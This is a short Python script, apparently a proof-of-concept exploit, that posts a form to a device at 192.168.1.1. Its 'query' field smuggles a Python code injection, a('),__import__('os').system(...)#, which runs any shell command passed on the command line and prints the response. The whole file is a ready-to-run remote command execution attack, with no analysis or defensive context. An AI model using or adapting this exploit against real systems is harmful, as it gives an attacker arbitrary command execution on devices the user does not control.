import requests
import sys

headers = {
    'Host': '192.168.1.1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '59',
    'Origin': 'http://192.168.1.1',
    'Connection': 'close',
    'Referer': 'http://192.168.1.1/',
    'Upgrade-Insecure-Requests': '1',
}

cmd = sys.argv[1]
data = f"engine=Accuweather&query=a'),__import__('os').system('{cmd}')#"

response = requests.post('http://192.168.1.1/search', headers=headers, data=data)

print(response.text)
